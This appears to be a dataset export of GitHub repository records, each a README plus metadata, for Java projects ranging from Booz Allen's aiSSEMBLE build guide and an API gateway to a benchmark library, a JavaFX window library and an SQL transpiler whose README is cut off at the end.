[![Publish to GitHub Pages](https://github.com/boozallen/aissemble/actions/workflows/publish.yml/badge.svg)](https://github.com/boozallen/aissemble/actions/workflows/publish.yml)
## aiSSEMBLE Overview

### Purpose of the aiSSEMBLE

aiSSEMBLE is Booz Allen's lean manufacturing approach for holistically designing, developing and fielding
AI solutions across the engineering lifecycle from data processing to model building, tuning, and training to secure
operational deployment. This repository consists of standardized components which make it easy for dev teams to quickly
reuse and apply to their project to drive consistency, reliability and low delivery risk. aiSSEMBLE offers projects the
rapid generation of necessary scaffolding, boilerplate libraries, and container images with the flexibility of custom
configuration. It consists of pre-fabricated components that can be used as is within your projects and generated
capabilities that can be extended.

### Languages and frameworks used to implement aiSSEMBLE

Many languages can be useful across the full breadth of AI solutions. Currently, the following languages are leveraged:
* Data Delivery / Machine Learning Inference
    * Java
    * Python
* Machine Learning Training
    * Python

In addition, the following build tools and container frameworks are an important part of aiSSEMBLE:
* Fermenter MDA
* Maven
    * Habushu Maven Plugin (builds Python modules)
    * Orphedomos Maven Plugin (build Docker modules)
    * Helm Maven Plugin
* Kubernetes
* Helm

### Detailed Documentation

[aiSSEMBLE documentation is available GitHub pages](https://boozallen.github.io/aissemble).

### aiSSEMBLE Releases

aiSSEMBLE is currently released about once a month, but we intend to increase to around twice a month as we get our
processes adjusted and honed into the public GitHub

## Environment Configuration

Please consult our [Configuring Your Environment guidance](https://boozallen.github.io/aissemble/aissemble/current/configurations.html).

## Build

The following steps will build aiSSEMBLE. *You must follow the configuration guidance above first*.
1. To get started, pull the latest code for the aiSSEMBLE repo from git.
1. [Configure ghcr.io **authentication** SNAPSHOT repository support - **server configuration is all you need, you can ignore setting up a repository**](https://docs.github.com/en/packages/working-with-a-github-packages-registry/working-with-the-apache-maven-registry#authenticating-with-a-personal-access-token)
1. Ensure Rancher Desktop is running.
1. Build the project locally using the `./mvnw clean install` command.
    * A successful build will have an output similar to the below.
    ```
            [INFO] ------------------------------------------------------------------------
            [INFO] BUILD SUCCESS
            [INFO] ------------------------------------------------------------------------
            [INFO] Total time:  10:16 min
            [INFO] Finished at: 2021-09-09T10:01:10-04:00
            [INFO] ------------------------------------------------------------------------
    ```

### Helpful Profiles
The aiSSEMBLE baseline project provides several build profiles that may be helpful for different development environments.
To activate each one, use the standard Maven syntax: `./mvnw clean install -P[profile_name]`, for
instance, `./mvnw clean install -PnoRdAdmin`.  There are many profiles you can find in the root `pom.xml` file. The
following profiles are often useful when first starting with aiSSEMBLE:

* *noRdAdmin*: For configurations that disallow granting administrator privileges to Rancher Desktop. Testing frameworks
  leveraged by aiSSEMBLE may, at times, assume that the docker unix socket is located at `/var/run/docker.sock`, which is
  not the case when presented with a non-elevated Rancher installation.  Activating this profile will override the
  `DOCKER_HOST` seen by these dependencies, pointing it instead at `unix://$HOME/.rd/docker.sock`.
* *integration-test*: Some integration tests require Docker and automatically start/stop Docker Compose services while
  executing tests (i.e. see the test/test-mda-models/test-data-delivery-pyspark-patterns module). **Note that the Maven
  build does not build the Docker images directly. The images are built within the Kubernetes cluster to speed up
  development builds and save disk space.**

## Use a Maven Archetype to Create a New aiSSEMBLE-Based Project

The first step in creating a new project is to leverage Maven’s archetype functionality to incept a new Maven project
that will contain all of your aiSSEMBLE component implementations - Data Delivery and Machine Learning pipelines as
well as Path to Production modules.

Open a terminal to the location in which you want your project to live and execute the following command:
```
./mvnw archetype:generate \
    -DarchetypeGroupId=com.boozallen.aissemble \
    -DarchetypeArtifactId=foundation-archetype \
    -DarchetypeVersion=<version number>
 ```
This command will trigger an interactive questionnaire giving you the opportunity to enter the following information (in order):
1. groupId
2. artifactId
3. version
4. package
5. projectGitUrl
6. projectName

* For details on these fields refer to https://boozallen.github.io/aissemble/aissemble/current/archetype.html

* For detailed instructions on adding a pipeline refer to (LINK COMING SOON) https://boozallen.github.io/aissemble/current-dev/add-pipelines-to-build.html

## Troubleshooting

When executing the `aissemble` build for the first time, you may encounter the following transient error when building
the `test-data-delivery-pyspark-patterns` module:
```
:: problems summary
:::::: WARNINGS
                [NOT FOUND  ] org.apache.commons#commons-math3;3.2!commons-math3.jar (0ms)
         ==== local-m2-cache: tried           file:/Users/ekonieczny/.m2/repository/org/apache/commons/commons-math3/3.2/commons-math3-3.2.jar
                 ::::::::::::::::::::::::::::::::::::::::::::::
                 ::              FAILED DOWNLOADS            ::
                 :: ^ see resolution messages for details ^. ::
                 ::::::::::::::::::::::::::::::::::::::::::::::
                 :: org.apache.commons#commons-math3;3.2!commons-math3.jar
                 ::::::::::::::::::::::::::::::::::::::::::::::
:::: ERRORS
        SERVER ERROR: Bad Gateway url=https://dl.bintray.com/spark-packages/maven/org/sonatype/oss/oss-parent/9/oss-parent-9.jar
         SERVER ERROR: Bad Gateway url=https://dl.bintray.com/spark-packages/maven/org/antlr/antlr4-master/4.7/antlr4-master-4.7.jar
         SERVER ERROR: Bad Gateway url=https://dl.bintray.com/spark-packages/maven/org/antlr/antlr-master/3.5.2/antlr-master-3.5.2.jar
```
If this occurs, remove your local Ivy cache (`rm -rf ~/.ivy2`) and then manually download the dependency that failed to
download. Taking the above error message as an example, the following Maven command would download the needed commons-math3 jar:

`./mvnw org.apache.maven.plugins:maven-dependency-plugin:get -Dartifact=org.apache.commons:commons-math3:3.2`","Booz Allen's lean manufacturing approach for holistically designing, developing and fielding AI solutions across the engineering lifecycle from data processing to model building, tuning, and training to secure operational deployment",,2024-04-04T20:18:45Z,2024-09-24T18:00:57Z,2024-09-25T21:25:30Z,5,31,200,324,33,8,33,24,4,NOASSERTION,Java
liuTianBo6/easyApi,master,"## 项目背景

API接口调用平台，帮助企业、个人统一开放接口，减少沟通成本，避免重复造轮子，为业务高效赋能。

- 普通用户：注册登录，开通接口调用权限，使用接口。

- 后台：调用统计和可视化分析接口调用情况，管理员发布接口、下线接口、新增接口。

主要功能：

- API接入
- 防止攻击（安全性） 
- 不能随便调用（限制、开通） 
- 统计调用次数 
- 计费 
- 流量保护

架构图：

![img](https://cbj-1302486078.cos.ap-nanjing.myqcloud.com/img/1671091690956-6eb1c6d1-07b3-4c12-9257-28b99e63cc52.png)

技术选型：

后端：

- Spring Boot
- Spring Boot Starter(SDK开发)
- Dubbo (RPC)
- Nacos(注册中心)
- Spring Cloud Gateway(网关、限流、日志实现)

启动方式：

后端：

- api-backend：7529端口，后端接口管理（上传、下线、用户登录）http://localhost:7529/api/doc.html
- api-gateway：8090端口，网关
- api-interface：8123端口，提供各种接口服务（可以有很多个且分布在各个服务器）。这里的tests有个发送请求的跑通流程的测试用例。
- api-client-sdgk：客户端SDK，无端口，发送请求到8090端口，由网关进行转发到后端的api-interface

详细设计文档：

- 见doc目录下",api开放平台,,2024-04-23T04:30:57Z,2024-04-23T05:13:13Z,,0,1,0,1,0,0,31,1,0,,Java
juneSir1/cxlaike-module-cxlaike,main,"## Table of content

- [简介](#%E7%AE%80%E4%BB%8B)
- [性能](#%E6%80%A7%E8%83%BD)
- [如何运行](#如何运行)
- [作者联系方式、寻求帮助、合作](#%E4%BD%9C%E8%80%85%E8%81%94%E7%B3%BB%E6%96%B9%E5%BC%8F--%E5%AF%BB%E6%B1%82%E5%B8%AE%E5%8A%A9--%E5%90%88%E4%BD%9C)


## 声明

**作者声明：没有在任何其它平台进行代码售卖，请谨慎鉴别，上当受骗作者一律不负责**

**本项目仅供学习交流，严禁用于任何商业和非法用途，非本人使用而产生的纠纷与一切后果均与本人无关。**

## 简介

本项项目是短视频矩阵混剪系统，分钟级支持上千条不重复视频生成，矩阵目前支持抖音和快手平台多账号管理及分发，如下是整个工程模块

![image](https://github.com/juneSir1/cxlaike-module-cxlaike/assets/22173263/0fc5db65-63b2-4967-8f2a-bf7e615af5ce)

## 性能
1. 本项目使用java8+vue2.0 语言开发，SaaS平台化商户管理；
2. 上传视频、图片等素材做了应用隔离，100M视频5s内完成；
3. 秒级计算混剪视频不重复组合，分钟级生成上千条不重复视频；


## 如何运行
本代码仅供参考学习查看，有部分代码缺失，请v联系：cxlailke

- Docker环境
- java环境
- node js环境，需要支持ES13的 node js版本，也就是node js版本要晚于June 2022

## 项目支持的功能
* 1、SaaS平台：多商户管理，商户充值续费；
* 2、多平台：抖音、快手平台多账号授权管理及自动更新；
* 3、智能混剪：自有视频组合算法，短视频批量化混剪，分钟级1000条不重复视频；
* 4、素材管理：视频、图片、音频自由素材管理；
* 5、AI文案：接入ChatGPT3.5，多种脚本模型匹配，自动生成；
* 6、智能分析：智能分析视频表现数据、账号表现数据及综合指标分析查看；
* 7、互动线索：私信、评论自动同步、回复功能；
* 8、多门店：多门店位置等信息管理；
* 9、财务管理：商户自主续费、充值；

## 作者联系方式 || 寻求帮助 || 源码合作
联系作者前可先注册本项目官方系统查看产品功能，注册邀请码：JXNE3nNj，访问：http://sj.cxlaike.com

由于出售的是源码，有诚意者加v请备注说明：短视频矩阵源码合作，否则可能不通过，还请理解。

微信:xiaoxiang8842

",短视频矩阵混剪系统、分钟级上千条不重复混剪视频，抖音、快手多账号管理、自动分发,,2024-04-18T02:49:21Z,2024-05-28T09:06:56Z,,0,1,0,18,0,12,31,1,0,,Java
yangfeng20/ja-netfilter,master,"# ja-netfilter 2022.2.0

### A Java Instrumentation Framework

## Usage

* download from the [releases page](https://gitee.com/ja-netfilter/ja-netfilter/releases)
* add `-javaagent:/absolute/path/to/ja-netfilter.jar` argument (**Change to your actual path**)
    * add as an argument of the `java` command. eg: `java -javaagent:/absolute/path/to/ja-netfilter.jar -jar executable_jar_file.jar`
    * some apps support the `JVM Options file`, you can add as a line of the `JVM Options file`.
    * **WARNING: DO NOT put some unnecessary whitespace characters!**
* or execute `java -jar /path/to/ja-netfilter.jar` to use `attach mode`.
* for **Java 17** you have to add at least these `JVM Options`:

  ```
  --add-opens=java.base/jdk.internal.org.objectweb.asm=ALL-UNNAMED
  --add-opens=java.base/jdk.internal.org.objectweb.asm.tree=ALL-UNNAMED
  ```

* edit your plugin config files: `${lower plugin name}.conf` file in the `config` dir where `ja-netfilter.jar` is located.
* the `config`, `logs` and `plugins` directories can be specified through **the javaagent args**.
  * eg: `-javaagent:/path/to/ja-netfilter.jar=appName`, your config, logs and plugins directories will be `config-appname`, `logs-appname` and `plugins-appname`.
  * if no javaagent args, they default to `config`, `logs` and `plugins`.
  * this mechanism will avoid extraneous and bloated `config`, `logs` and `plugins`.

* run your java application and enjoy~

## Config file format

```
[ABC]
# for the specified section name

# for example
[URL]
EQUAL,https://someurl

[DNS]
EQUAL,somedomain

# EQUAL       Use `equals` to compare
# EQUAL_IC    Use `equals` to compare, ignore case
# KEYWORD     Use `contains` to compare
# KEYWORD_IC  Use `contains` to compare, ignore case
# PREFIX      Use `startsWith` to compare
# PREFIX_IC   Use `startsWith` to compare, ignore case
# SUFFIX      Use `endsWith` to compare
# SUFFIX_IC   Use `endsWith` to compare, ignore case
# REGEXP      Use regular expressions to match
```


## Debug info

* the `ja-netfilter` will **NOT** output debugging information by default
* add environment variable `JANF_DEBUG=1` (log level) and start to enable it
* or add system property `-Djanf.debug=1` (log level) to enable it
* log level: `NONE=0`, `DEBUG=1`, `INFO=2`, `WARN=3`, `ERROR=4`

## Debug output

* the `ja-netfilter` will output debugging information to the `console` by default
* add environment variable `JANF_OUTPUT=value` and start to change output medium
* or add system property `-Djanf.output=value` to change output medium
* output medium value: [`NONE=0`, `CONSOLE=1`, `FILE=2`, `CONSOLE+FILE=3`, `WITH_PID=4`]
* eg: `console` + `file` + `pid file name` = 1 + 2 + 4 = 7, so the `-Djanf.output=7`

## Plugin system

* for developer:
    * view the [scaffold project](https://gitee.com/ja-netfilter/ja-netfilter-sample-plugin) written for the plugin system
    * compile your plugin and publish it
    * just use your imagination~

* for user:
    * download the jar file of the plugin
    * put it in the subdirectory called `plugins` where the ja-netfilter.jar file is located
    * enjoy the new capabilities brought by the plugin
    * if the file suffix is `.disabled.jar`, the plugin will be disabled
   
",,,2024-04-10T02:21:18Z,2024-04-10T02:23:56Z,,0,5,0,48,1,32,29,1,0,GPL-3.0,Java
gz10177lg/Light-Benchmark,v1.0.3,"# Light-Benchmark

Latest Version：v1.0.3

这是一款简单、轻量级别的基准测试工具。

## 特点：

1. 使用简单，一个LightBuilder即可构建简单测试

2. 仅需引入一个依赖，在需要执行的方法地方加上@LightBenchmark注解即可

3. 支持启用异步线程执行任务，最后将数据归总
4. jar包大小仅14.5kb

## 使用案例demo：

1. 对Light-Benchmark项目使用maven进行打包。

2. 在项目引入maven依赖。

   ```xml
   <dependency>
     <groupId>com.Light-Benchmark</groupId>
     <artifactId>Light-Benchmark</artifactId>
     <version>1.0.3</version>
   </dependency>
   ```

3. 在需要测试的方法加上@LightBenchmark注解。

   1. 方法不限任意权限操作符，可以private、protected等。
   2. 方法不限任意返回类型，可以void、String等。
   3. **方法目前暂不支持有参形式**。

   ```java
   public class UserService {
       @LightBenchmark
       public void createUUID() {	
           String uuid = UUID.randomUUID().toString();
       }
     
       @LightBenchmark
       private String createUUID2() {	
           return UUID.randomUUID().toString();
       }
     
     /*  暂不支持有参方法，否则会报错。
         @LightBenchmark
         private String createUUID3(String name) {	
             return UUID.randomUUID().toString() + name;
         }
     */
   }
   ```

4. 构建启动方法，传入参数，并启动。

   ```java
   public static void main(String[] args) {
           LightBuilder.build()
                   .model(LightBuilderConstant.OPS)
                   .clazz(UserService.class)
                   .warmupTestTimes(5)
                   .testTimes(5)
                   .unit(TestTimeUnit.US)
                   .threads(4)
                   .startTest();
   }
   ```

5. 参数介绍：

   | 参数方法        | 说明           | 可选值                      | 值说明                     | 必填 |
      | --------------- | -------------- |--------------------------| -------------------------- | ---- |
   | model           | 测试模式       | LightBuilderConstant.OPS | 吞吐量（如ops/us）         | 是   |
   | clazz           | 测试类Class    | 自行传入                     |                            | 是   |
   | warmupTestTimes | 预热执行次数   | Long类型的值，默认值为5           | 进行5次预热执行            | 否   |
   | testTimes       | 正式执行次数   | Long类型的值，默认值为5           | 进行5次正式执行            | 否   |
   | unit            | 执行结果单位   | TestTimeUnit.SECOND      | 秒（ops/s）                | 否   |
   |                 |                | TestTimeUnit.MS          | 毫秒（ops/ms）             | 否   |
   |                 |                | TestTimeUnit.US（默认值）     | 微秒（ops/us）             | 否   |
   | threads         | 异步执行线程数 | 4                        | 一个任务同时由几个线程执行 | 否   |

6. 测试结果：

   1. 单线程

      ```txt
      预热阶段——【com.rong.test.model.UserService$createUUID】
      ========start========
      1.463 ops/us
      2.071 ops/us
      2.247 ops/us
      2.266 ops/us
      2.241 ops/us
      ========end========
      
      正式阶段——【com.rong.test.model.UserService$createUUID】
      ========start========
      2.243 ops/us
      2.242 ops/us
      2.237 ops/us
      2.219 ops/us
      2.242 ops/us
      ========end========
      ```

   2. 异步多线程（4线程）

      ```txt
      预热阶段——【com.rong.test.model.UserService$createUUID】线程数：4
      ========start========
      Total：1.31  ops/us
      Total：2.04  ops/us
      Total：2.12  ops/us
      Total：2.14  ops/us
      Total：2.08  ops/us
      ========end========
      正式阶段——【com.rong.test.model.UserService$createUUID】线程数：4
      ========start========
      Total：2.08  ops/us
      Total：2.10  ops/us
      Total：2.09  ops/us
      Total：2.09  ops/us
      Total：2.08  ops/us
      ========end========
      预热阶段——【com.rong.test.model.UserService$createSystemTime】线程数：4
      ========start========
      Total：1064.46  ops/us
      Total：1014.71  ops/us
      Total：1079.31  ops/us
      Total：1039.64  ops/us
      Total：995.41  ops/us
      ========end========
      正式阶段——【com.rong.test.model.UserService$createSystemTime】线程数：4
      ========start========
      Total：1090.53  ops/us
      Total：1015.10  ops/us
      Total：983.70  ops/us
      Total：1059.62  ops/us
      Total：1036.90  ops/us
      ========end========
      ```

## 注意事项：

1. 如果多次执行数据偏差较大，则可以在**预热执行次数**适当提高执行次数。譬如下情况：

   ```java
   LightBuilder.build()
       .model(LightBuilderConstant.OPS)
       .clazz(UserService.class)
       .warmupTestTimes(2)	//次数太低，可增加执行次数，譬如设置到 5 及以上。
       .testTimes(2)
       .unit(TestTimeUnit.US)
       .startTest();
   ```

   ```txt
   预热阶段——【com.rong.test.model.UserService$createUUID】
   ========start========
   1.481 ops/us
   2.083 ops/us
   ========end========
   ```

   Tips：原因是执行次数过低，JIT还没有介入，没有被标记为热点代码，导致执行效率不高。",,,2024-04-13T14:43:30Z,2024-04-22T14:00:25Z,,0,1,0,8,0,0,29,3,0,,Java
trustin/thread-pool,master,,The thread pool I implemented in my YouTube live,,2024-04-08T15:02:06Z,2024-04-29T15:31:31Z,,0,1,0,3,0,2,29,1,0,Apache-2.0,Java
thesurlydev/spring-ai-collab,main,"# Spring AI Collab

An agent framework using [Spring AI](https://spring.io/projects/spring-ai).

## Features

- Support for multiple agents and tools via simple annotations.
- Leverages [Spring AI](https://spring.io/projects/spring-ai) for abstractions. 
- Automatically selects agent and tools based on the given task.
- Web chat interface to perform tasks and optionally assign an agent.
    - If no agent is specified, the underlying LLM is used to choose an agent based on the task. 

## Roadmap

Note: Some of the roadmap features depend on Chat message history which is not available in Spring AI yet.

- Process multiple tasks at once.
- Compose ""teams"" of agents that collaboratively work together to accomplish tasks.
- Add JVM code creation and execution. (Java, Kotlin)

## Requirements

This project uses [OpenAI](https://openai.com/) as the default LLM.

- Set `OPENAI_API_KEY` environment variable. 

## Build and Test

To build and run tests:
```shell
./gradlew clean build
```

## Inspired by

- [Microsoft's Autogen](https://www.microsoft.com/en-us/research/project/autogen/)
- [Crew AI](https://www.crewai.com/)
",An agent framework using Spring AI,"spring,spring-ai,spring-ai-openai,spring-boot",2024-04-19T17:03:40Z,2024-07-26T14:38:14Z,,0,1,1,34,1,8,29,1,0,Apache-2.0,Java
GeyserExtensionists/GeyserModelEngine,main,"# GeyserModelEngine 
# About

Thanks to [Willem](https://github.com/OmeWillem) for adding the following features:
- Part Visibility
- Color support
- Scaling support
- & more

# How To Install

Download the following plugins according to what server software you use.

| plugins                        | Link                                                                 | effect                          |
| :---                           | :----                                                                | :---                            |
| GeyserUtils                    | [Github](https://github.com/GeyserExtensionists/GeyserUtils)                    | Get your Geyser to support calling some BE stuff  |
| GeyserModelEngine              | [Github](https://github.com/GeyserExtensionists/GeyserModelEngine)              | Make your bedrock support MEG4                            |
| GeyserModelEnginePackGenerator | [Github](https://github.com/GeyserExtensionists/GeyserModelEnginePackGenerator) | Help you automatically transform the model to generate resource packs        |

- Put `GeyserModelEngine` in the plugins folder (only Spigot or forks of Spigot supported)
- Put either `geyserutils-spigot` in your plugins folder aswell (`geyserutils-velocity`/`geyserutils-bungeecord` in your Velocity/Bungeecord plugins folder if you use it)
- Put `GeyserModelEnginePackGenerator` and `geyserutils-geyser` into `plugins/[Geyser-Folder]/extensions`

Start the server to generate the relevant configuration files, and then shut down the server to convert any models.

# Convert Models

`GeyserModelEnginePackGenerator` is capable of generating models all by itself. After generating it will also apply this pack automatically.

- First go to `plugins/[Geyser-Folder]/extensions/geysermodelenginepackgenerator/input/`
- Create a folder in this directory with the ID of the model. (this is the same name as your model within ModelEngine 4.)

<img src=""docsimg/example.jpg"" width=""500"">

> Each model should have a separate model folder
> Subfolders are supported if you want to categorize them

- Now use BlockBench and convert your model to a Bedrock Entity, this will allow you to export the Bedrock Geometry and Animations.
- Put the geometry, animations and texture file in this folder you've made.

> The new version of BlockBench exports the bedrock model format_version as `1.21.0`.
> You need to change it to `1.12.0` manually.
> Otherwise your client will NOT see the model.

<img src=""docsimg/example1.jpg"" width=""500"">

- Restart the server or reload geyser to start generating the resource pack.
- Go to  `plugins/[Geyser-Folder]/extensions/geysermodelenginepackgenerator`, and you should see your pack generated!

<img src=""docsimg/example2.jpg"" width=""500"">

- Final step, reload Geyser or restart the server to load the resource pack.
- Congratulations, you've completed this tutorial!

# Tips

* Pay attention! The pack only regenerates when the number of models changes, you can technically speaking remove the generated_pack folder to force a reload aswell.
* You do not have to manually put the pack into the packs folder of Geyser, the extension is capable of loading the pack itself.

# Current issues

* Multi-textures are not supported
* Please report any bugs

# FAQ

### Where can I contact you?
You can contact us on our Discord: https://discord.gg/NNNaUdAbpP
",,,2024-04-13T03:29:57Z,2024-09-22T12:30:33Z,2024-09-22T12:30:33Z,2,4,13,130,1,10,29,3,1,MIT,Java
xdsswar/nfx-lib,master,"
# nfx-core for Windows

nfx-core is a JavaFx/JNI library designed exclusively for Windows (Tested on Windows 11). It enhances your Java applications by allowing advanced manipulation of the Stage's title bar and custom decorations.

## Features

- **Native Behavior**: Ensures that the window behaviors align with standard Windows interactions.
- **Native Snap Layout**: Supports Windows 11 snap layouts. On Windows 10, it defaults to the native tooltip system.
- **Native Tooltips**: Utilize Windows' built-in tooltips for a consistent look and feel.
- **Full Customization**: All decoration elements can be fully customized from the JavaFX side.
- **Easy Theme Creation**: Facilitates the creation of custom themes.
- **Caption Color Customization**: Easily set the caption color for `NfxWindow` instances using methods like:
  ```java
  setCaptionColor(""#D35400"");
  setCaptionColor(Color.RED);
  ```
- **Additional Features**: Includes more enhancements and functionalities to explore.

## Examples

Check out our interactive examples to see `nfx-core` in action:

- [Demo Application Code](demo/src/main/java/xss/it/demo/Demo.java)

## Screenshots

Here are some visual examples of what `nfx-core` can do:

1. **NfxWindow Example**  
   ![NfxWindow Example](screenshots/1.png)

2. **Custom Window**  
   Extending from `AbstractNfxUndecoratedWindow`  
   ![Custom Window](screenshots/2.png)

3. **Custom Dialog**  
   Demonstrates a custom dialog that can be hidden or shown in the taskbar  
   ![Custom Dialog](screenshots/3.png)

4. **Custom Dialog**  
   MenuWindow Demo  
   ![Custom Dialog](screenshots/4.png)

For more examples and in-depth usage, check out our demo.

## Important Note

To ensure efficient support, please provide a minimal reproducible code example when reporting issues. We focus on issues that include such code to help diagnose and address concerns effectively.
",JavaFx/JNI library designed exclusively for Windows (Tested on Windows 11). It enhances your Java applications by allowing advanced manipulation of the Stage's title bar and custom decorations.,,2024-04-14T00:58:42Z,2024-08-04T17:24:03Z,,0,1,0,16,1,4,28,1,0,,Java
IlyaKukharchuk/InfopostAccountService,main,"# infopost-account-service

The infopost-account-service is a RESTful service designed for managing users’ personal data, status, and transactions. It allows for account operations such as replenishment and debiting, with support for concurrent transactions on a single account.

## Features

- Store and manage personal user data
- Record account status and transactions
- Support for account replenishment and debiting
- Concurrent operations on accounts

## Built With

- Java 17
- Spring Boot (version 3.0.2)
- PostgreSQL
- Gradle (version 7.4)
- JUnit Jupiter (version 5.9.0), Mockito(version 5.9.0), SpringBootTest for testing
- Swagger (version 2.0.10) for API documentation
- Docker for containerization
- Flyway for database migration

## Getting Started

### Prerequisites

- Java 17
- Gradle
- Docker
- PostgreSQL

### Installation

1. Clone the repository:
   `bash
   git clone https://github.com/your-repo/infopost-account-service.git`

2. Navigate to the project directory:
   `bash
   cd infopost-account-service`

3. Build the project:
   `bash
   gradle build`

4. Run the application:
   `bash
   gradle bootRun`


## API Endpoints

You can view and interact with the API using Swagger UI. To open Swagger UI, navigate to:

http://localhost:8080/swagger-ui.html

Replace 8080 with the appropriate port if your application runs on a different one.

![image](https://github.com/qrwtruyqieygfdh/InfopostAccountService/assets/63457388/c3e9003b-6b0e-40ca-a30a-f70abfea8918)

## Entity Relationship Diagram

![image](https://github.com/qrwtruyqieygfdh/InfopostAccountService/assets/63457388/c65845f5-20ba-4ac9-8c0c-7137e02d0487)

## Authors

- **Ilya Kukharchuk** - *Java Software Engineer*

   - [LinkedIn Profile](https://linkedin.com/in/ilya-kukharchuk)
   - Email: iliakuharchuk@mail.ru

","The infopost-account-service is a RESTful service designed for managing users’ personal data, status, and transactions. It allows for account operations such as replenishment and debiting, with support for concurrent transactions on a single account.",,2024-04-13T15:32:07Z,2024-04-16T18:06:05Z,,0,1,0,4,0,0,28,1,0,,Java
starlake-ai/jsqltranspiler,main,"# [JSQLTranspiler](https://starlake.ai/starlake/index.html#sql-transpiler) - Transpile Dialect, Resolve Columns, Show Lineage

[![Sonatype Nexus (Snapshots)](https://img.shields.io/nexus/s/ai.starlake.jsqltranspiler/jsqltranspiler?server=https%3A%2F%2Fs01.oss.sonatype.org)](https://s01.oss.sonatype.org/#nexus-search;quick~ai.starlake.jsqltranspiler/jsqltranspiler)
[![JavaDoc](https://javadoc.io/badge2/ai.starlake.jsqltranspiler/jsqltranspiler/javadoc.svg)](https://javadoc.io/doc/ai.starlake.jsqltranspiler/jsqltranspiler)
[![Gradle CI](https://github.com/starlake-ai/jsqltranspiler/actions/workflows/snapshot.yml/badge.svg)](https://github.com/starlake-ai/jsqltranspiler/actions/workflows/snapshot.yml)
[![Code Quality](https://app.codacy.com/project/badge/Grade/80374649d914462ebd6e5b160a1ebdbb)](https://app.codacy.com/gh/starlake-ai/jsqltranspiler/dashboard?utm_source=gh&utm_medium=referral&utm_content=&utm_campaign=Badge_grade)
[![Coverage](https://coveralls.io/repos/github/starlake-ai/jsqltranspiler/badge.svg)](https://coveralls.io/github/starlake-ai/jsqltranspiler)
[![License](https://img.shields.io/badge/License-Apache-blue)](#LICENSE)
[![Issues](https://img.shields.io/github/issues/starlake-ai/jsqltranspiler)](https://github.com/starlake-ai/jsqltranspiler/issues)
[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](https://egghead.io/courses/how-to-contribute-to-an-open-source-project-on-github?af=5236ad)

A pure Java stand-alone SQL Transpiler, Column- and Lineage Resolver for translating various large RDBMS SQL Dialects into a few smaller RDBMS Dialects for Unit Testing. Based on JSQLParser.

Supports `SELECT` queries as well as `INSERT`, `UPDATE`, `DELETE` and `MERGE` statements.

Internal Functions will be rewritten based on the actual meaning and purpose of the function (since DuckDB `Any()` function does not necessarily behave like the RDBMS specific `Any()`). Respecting different function arguments count, order and type.

Rewrite of Window- and Aggregate-Functions with full coverage of the RDBMS specific published samples.
The [matrix of supported features and functions](https://docs.google.com/spreadsheets/d/1jK6E1s2c0CWcw9rFeDvALdZ5wCshztdtlAHuNDaKQt4/edit?usp=sharing) is shared on Google Sheets.

## Dialects

**Input**: Google BigQuery, Databricks, Snowflake, Amazon Redshift

**Output**: DuckDB

## Transpile Example

Google BigQuery specific SQL

```sql
-- BigQuery specific DATE() function
SELECT
  DATE(2016, 12, 25) AS date_ymd,
  DATE(DATETIME '2016-12-25 23:59:59') AS date_dt,
  DATE(TIMESTAMP '2016-12-25 05:30:00+07', 'America/Los_Angeles') AS date_tstz;

/* Output
""date_ymd"",""date_dt"",""date_tstz""
""2016-12-15"",""2016-12-15"",""2016-12-15""
*/
```

will become DuckDB compatible SQL

```sql
-- DuckDB compliant rewrite producing the same result
SELECT
  MAKE_DATE(2016, 12, 25) AS date_ymd,
  CAST(DATETIME '2016-12-25 23:59:59' AS DATE) AS date_dt,
  CAST(TIMESTAMP '2016-12-25 05:30:00+07' AS DATE) AS date_tstz;

/* Output
""date_ymd"",""date_dt"",""date_tstz""
""2016-12-15"",""2016-12-15"",""2016-12-15""
*/
```

## Column Lineage Example
For the simplified schema definition and the given query
```java
String[][] schemaDefinition = {
        // Table A with Columns col1, col2, col3, colAA, colAB
        {""a"", ""col1"", ""col2"", ""col3"", ""colAA"", ""colAB""},

        // Table B with Columns col1, col2, col3, colBA, colBB
        {""b"", ""col1"", ""col2"", ""col3"", ""colBA"", ""colBB""}
};

String sqlStr =
        ""SELECT Case when Sum(colBA + colBB)=0 then c.col1 else a.col2 end AS total FROM a INNER JOIN (SELECT * FROM b) c ON a.col1 = c.col1"";

JdbcResultSetMetaData resultSetMetaData = new JSQLColumResolver(databaseMetaData).getResultSetMetaData(sqlStr);
```

the ResultSetMetaData return a list of JdbcColumns, each traversable using the `TreeNode` interface. The resulting Column Lineage can be illustrated as:
```
SELECT
 └─total AS CaseExpression: CASE WHEN Sum(colBA + colBB) = 0 THEN c.col1 ELSE a.col2 END
    ├─WhenClause: WHEN Sum(colBA + colBB) = 0 THEN c.col1
    │  ├─EqualsTo: Sum(colBA + colBB) = 0
    │  │  └─Function: Sum(colBA + colBB)
    │  │     └─Addition: colBA + colBB
    │  │        ├─c.colBA → b.colBA : Other
    │  │        └─c.colBB → b.colBB : Other
    │  └─c.col1 → b.col1 : Other
    └─a.col2 : Other
```


## Resolve ``*`` Star Operator Example

For the simplified schema definition and the given query with Star Operators
```java
String[][] schemaDefinition = {
    // Table A with Columns col1, col2, col3, colAA, colAB
    {""a"", ""col1"", ""col2"", ""col3"", ""colAA"", ""colAB""},

    // Table B with Columns col1, col2, col3, colBA, colBB
    {""b"", ""col1"", ""col2"", ""col3"", ""colBA"", ""colBB""}
};

String sqlStr = ""SELECT * FROM ( (SELECT * FROM b) c inner join a on c.col1 = a.col1 ) d;"";
String resolved =  new JSQLColumResolver(schemaDefinition).getResolvedStatementText(sqlStr);
```

the query will be resolved and (optionally rewritten into):
```sql
SELECT  d.col1                 /* Resolved Column*/
        , d.col2               /* Resolved Column*/
        , d.col3               /* Resolved Column*/
        , d.colBA              /* Resolved Column*/
        , d.colBB              /* Resolved Column*/
        , d.col1_1             /* Resolved Column*/
        , d.col2_1             /* Resolved Column*/
        , d.col3_1             /* Resolved Column*/
        , d.colAA              /* Resolved Column*/
        , d.colAB              /* Resolved Column*/
FROM (  (   SELECT  b.col1     /* Resolved Column*/
                    , b.col2   /* Resolved Column*/
                    , b.col3   /* Resolved Column*/
                    , b.colba  /* Resolved Column*/
                    , b.colbb  /* Resolved Column*/
            FROM b ) c
            INNER JOIN a
                ON c.col1 = a.col1 ) d
;
```

Alternatively, the information about returned columns can be fetched as JDBC `ResultsetMetaData` (without actually executing this query):

```java
import java.sql.DatabaseMetaData;

String sqlStr = ""SELECT * FROM (  (  SELECT * FROM sales ) c INNER JOIN listing a ON c.listid = a.listid ) d;"";
// the meta data of catalgogs, schemas, tables, columns, either virtually and physically
DatabaseMetaData databaseMetaData = ...;
